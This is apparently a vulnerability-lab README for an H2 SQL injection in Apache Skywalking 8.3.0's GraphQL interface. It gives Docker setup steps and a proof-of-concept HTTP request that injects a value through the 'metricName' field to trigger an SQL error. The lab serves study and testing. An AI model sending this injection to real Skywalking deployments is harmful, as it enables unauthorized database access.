# Apache Skywalking 8.3.0 SQL Injection Vulnerability

[中文版本(Chinese version)](README.zh-cn.md)

Application performance monitor tool for distributed systems, especially designed for microservices, cloud native and container-based (Docker, Kubernetes, Mesos) architectures.

In GraphQL interfaces of Apache Skywalking 8.3.0 and previous, there is a H2 Database SQL injection vulnerability.

Reference link:

- https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
- https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c

## Vulnerability environment

Execute the following command to start an Apache Skywalking 8.3.0:

```
docker-compose up -d
```

After the environment is started, visit `http://your-ip:8080` to view the Skywalking page.

## POC

I use GraphiQL's desktop app to send the following GraphQL query:

![](1.png)

It can be seen that the SQL statement has raised error, and the value of the `metricName` parameter has been injected ​​after `from`.

The HTTP request of this GraphQL query is:

```
POST /graphql HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 336

{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"sqli",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}
```

For more in-depth exploit, you can research by yourself, and welcome to submit PR to us.
